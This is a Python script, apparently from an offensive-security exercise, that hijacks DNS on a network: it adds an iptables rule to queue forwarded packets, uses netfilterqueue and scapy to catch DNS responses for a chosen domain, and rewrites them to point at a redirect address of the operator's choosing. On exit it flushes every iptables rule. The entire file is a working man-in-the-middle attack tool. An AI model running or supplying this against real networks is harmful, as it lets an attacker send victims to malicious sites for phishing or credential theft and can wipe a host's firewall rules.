import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse


def get_arguments():
	"""This will get the user args"""
	parser =  argparse.ArgumentParser()
	parser.add_argument('-s', '--spoof', help= 'The domain to spoof for')
	parser.add_argument('-r', '--redirection', help= 'The redirect location')
	args = parser.parse_args()
	return args.spoof, args.redirection


def process_pkt(packet):
	"""The call back function form queue.bind on line 43"""
	target_url= domain
	#Converting the netfilter packet to a scapy packet
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):#If that packet has the payer of DNSResponse
		qname = scapy_packet[scapy.DNSQR].qname #Taking the query that the target made from the DNSOuery
		if target_url in str(qname):
			print('[+] Spoofing for '+ target_url + ' as '+ redirection)
			answer = scapy.DNSRR(rrname= qname, rdata= redirection)	#Making a pkt to send for spoofing
			scapy_packet[scapy.DNS].an = answer #Replacing the answer layer with the layer we created"""
			scapy_packet[scapy.DNS].ancount = 1	#Removing the answer count in the pkt

			#Removing the stuff that will cause errors in our pkt on the receiver	
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			#All this will be recalculated by scapy

			packet.set_payload(bytes(scapy_packet))	#Setting the payload in the original pkt
	packet.accept()	#Forwarding the payload pkt

queue = netfilterqueue.NetfilterQueue() #Making our queue
domain, redirection = get_arguments()

try:
	subprocess.call(['sudo', 'iptables', '-I', 'FORWARD','-j','NFQUEUE','--queue-num' ,'0'])
	print('[*]sudo iptables -I FORWARD -j NFQUEUE --queue-num 0') # Putting the packets from the target in our queue 0
	queue.bind(0, process_pkt) #binding the python queue to the iptable queue
	queue.run()
except KeyboardInterrupt:
	print('\n[!]Flushing the iptables')
	subprocess.call(['sudo','iptables','--flush'])
